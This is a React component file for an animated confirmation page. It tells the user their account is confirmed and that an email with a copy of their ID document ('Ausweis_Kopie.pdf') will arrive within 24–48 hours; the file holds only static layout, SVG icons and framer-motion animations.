import Layout from "../components/layout/Layout";
import { motion } from "framer-motion";

function PdfIcon() {
  return (
    <svg width="40" height="48" viewBox="0 0 40 48" fill="none" aria-hidden="true">
      <path
        d="M4 4C4 1.79086 5.79086 0 8 0H24L36 12V44C36 46.2091 34.2091 48 32 48H8C5.79086 48 4 46.2091 4 44V4Z"
        fill="url(#pdfGrad)"
      />
      <path d="M24 0L36 12H28C25.7909 12 24 10.2091 24 8V0Z" fill="#FF8A80" />
      <path d="M24 0L36 12H28C25.7909 12 24 10.2091 24 8V0Z" fill="white" fillOpacity="0.25" />
      <rect x="9" y="22" width="22" height="14" rx="3" fill="white" fillOpacity="0.95" />
      <text
        x="20"
        y="32.5"
        textAnchor="middle"
        fontFamily="SF Pro Display, Helvetica, Arial, sans-serif"
        fontSize="8"
        fontWeight="700"
        fill="#E53935"
        letterSpacing="0.4"
      >
        PDF
      </text>
      <defs>
        <linearGradient id="pdfGrad" x1="4" y1="0" x2="36" y2="48" gradientUnits="userSpaceOnUse">
          <stop stopColor="#FF6B6B" />
          <stop offset="1" stopColor="#E53935" />
        </linearGradient>
      </defs>
    </svg>
  );
}

function SuccessPage() {
  return (
    <Layout>
      <style>{`
        @keyframes success-pulse {
          0%, 100% { transform: scale(1); opacity: 0.3; }
          50% { transform: scale(1.1); opacity: 0.55; }
        }
        @keyframes float-doc {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-4px); }
        }
      `}</style>

      <div className="pt-[20px] sm:pt-[44px] pb-[24px] sm:pb-0">
        <div className="w-full flex flex-col items-center px-0 sm:px-4">
          <div
            className="w-full sm:w-[640px] min-h-[calc(100dvh-120px)] sm:min-h-0 sm:h-[712px] apple-shadow sm:rounded-[34px] sm:mt-[44px] flex flex-col"
            style={{ background: "var(--card-bg)" }}
          >
            <div className="flex-1 flex flex-col items-center px-[24px] sm:px-[72px] pt-[20px] sm:pt-[32px] pb-[28px] sm:pb-[36px]">
              <motion.div
                initial={{ opacity: 0, scale: 0.92 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
                className="w-[110px] h-[110px] sm:w-[160px] sm:h-[160px] flex items-center justify-center shrink-0"
              >
                <img
                  src="/logo.png?v=5"
                  alt=""
                  className="w-full h-full object-contain select-none"
                  draggable={false}
                />
              </motion.div>

              <div className="relative mt-[4px] sm:mt-[8px] w-[72px] h-[72px] sm:w-[96px] sm:h-[96px] flex items-center justify-center">
                <div
                  className="absolute inset-[-8px] rounded-full"
                  style={{
                    background:
                      "radial-gradient(circle, rgba(52,199,89,0.28) 0%, transparent 68%)",
                    animation: "success-pulse 2.4s ease-in-out infinite",
                  }}
                />
                <motion.div
                  initial={{ scale: 0.55, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  transition={{ duration: 0.5, delay: 0.2, ease: [0.22, 1, 0.36, 1] }}
                  className="relative w-[52px] h-[52px] sm:w-[64px] sm:h-[64px] rounded-full flex items-center justify-center"
                  style={{
                    background: "rgba(52, 199, 89, 0.14)",
                    boxShadow: "0 0 0 1px rgba(52,199,89,0.18)",
                  }}
                >
                  <svg width="28" height="28" viewBox="0 0 36 36" fill="none">
                    <motion.circle
                      cx="18"
                      cy="18"
                      r="16"
                      stroke="rgba(52,199,89,0.25)"
                      strokeWidth="1.5"
                      fill="none"
                      initial={{ pathLength: 0, opacity: 0 }}
                      animate={{ pathLength: 1, opacity: 1 }}
                      transition={{ duration: 0.6, delay: 0.25 }}
                    />
                    <motion.path
                      d="M8 18.5L14.5 25L28 11"
                      stroke="#34c759"
                      strokeWidth="3.2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      fill="none"
                      initial={{ pathLength: 0 }}
                      animate={{ pathLength: 1 }}
                      transition={{ duration: 0.55, delay: 0.4, ease: "easeOut" }}
                    />
                  </svg>
                </motion.div>
              </div>

              <motion.h1
                initial={{ opacity: 0, y: 12 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.45, duration: 0.45 }}
                className="mt-[16px] sm:mt-[20px] text-center font-apple text-[22px] sm:text-[30px] font-[600] leading-[1.25] tracking-[-0.015em] max-w-[440px]"
                style={{ color: "var(--text-primary)" }}
              >
                Your account has been successfully confirmed.
              </motion.h1>

              <motion.p
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.58, duration: 0.4 }}
                className="mt-[10px] sm:mt-[12px] text-center font-apple text-[14px] sm:text-[15px] leading-[1.45] max-w-[400px]"
                style={{ color: "var(--text-secondary)" }}
              >
                You will receive a confirmation email within the next 24–48
                hours, including a copy of your ID document.
              </motion.p>

              <motion.div
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.75, duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
                className="mt-[22px] sm:mt-[28px] w-full max-w-[400px]"
              >
                <div
                  className="relative overflow-hidden rounded-[16px] sm:rounded-[18px] border px-[14px] sm:px-[16px] py-[14px] sm:py-[16px]"
                  style={{
                    borderColor: "var(--footer-border)",
                    background: "var(--input-bg)",
                    boxShadow: "0 10px 30px rgba(0,0,0,0.04)",
                  }}
                >
                  <div
                    className="pointer-events-none absolute -right-8 -top-10 h-[120px] w-[120px] rounded-full opacity-60"
                    style={{
                      background:
                        "radial-gradient(circle, rgba(229,57,53,0.12) 0%, transparent 70%)",
                    }}
                  />

                  <div className="relative flex items-center gap-[12px] sm:gap-[14px]">
                    <div
                      className="shrink-0 scale-90 sm:scale-100 origin-left"
                      style={{ animation: "float-doc 3s ease-in-out infinite" }}
                    >
                      <PdfIcon />
                    </div>

                    <div className="min-w-0 flex-1">
                      <p
                        className="font-apple text-[10px] sm:text-[11px] uppercase tracking-[0.08em]"
                        style={{ color: "var(--text-secondary)" }}
                      >
                        Attachment · Email
                      </p>
                      <p
                        className="mt-[3px] font-apple text-[14px] sm:text-[15px] font-[600] tracking-tight truncate"
                        style={{ color: "var(--text-primary)" }}
                      >
                        Ausweis_Kopie.pdf
                      </p>
                      <p
                        className="mt-[3px] font-apple text-[12px] sm:text-[13px]"
                        style={{ color: "var(--text-secondary)" }}
                      >
                        PDF · Sent within 24–48 hours
                      </p>
                    </div>

                    <motion.div
                      initial={{ scale: 0 }}
                      animate={{ scale: 1 }}
                      transition={{ delay: 1.05, type: "spring", stiffness: 260, damping: 18 }}
                      className="shrink-0 w-[28px] h-[28px] rounded-full flex items-center justify-center"
                      style={{ background: "rgba(52, 199, 89, 0.15)" }}
                      title="Queued"
                    >
                      <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                        <path
                          d="M3 7.2L5.8 10L11 4"
                          stroke="#34c759"
                          strokeWidth="1.8"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    </motion.div>
                  </div>

                  <div
                    className="relative mt-[12px] sm:mt-[14px] h-[3px] w-full overflow-hidden rounded-full"
                    style={{ background: "var(--footer-border)" }}
                  >
                    <motion.div
                      className="h-full rounded-full"
                      style={{
                        background:
                          "linear-gradient(90deg, #34c759 0%, #30d158 100%)",
                      }}
                      initial={{ width: "0%" }}
                      animate={{ width: "100%" }}
                      transition={{ delay: 0.95, duration: 1.2, ease: [0.22, 1, 0.36, 1] }}
                    />
                  </div>
                  <p
                    className="relative mt-[8px] font-apple text-[11px] sm:text-[12px] text-center"
                    style={{ color: "var(--text-secondary)" }}
                  >
                    Ausweis-Kopie prepared for delivery
                  </p>
                </div>
              </motion.div>

              <motion.p
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: 1.2, duration: 0.4 }}
                className="mt-auto pt-[20px] sm:pt-[24px] text-center font-apple text-[12px] sm:text-[13px]"
                style={{ color: "var(--text-secondary)" }}
              >
                No further action is required right now.
              </motion.p>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
}

export default SuccessPage;
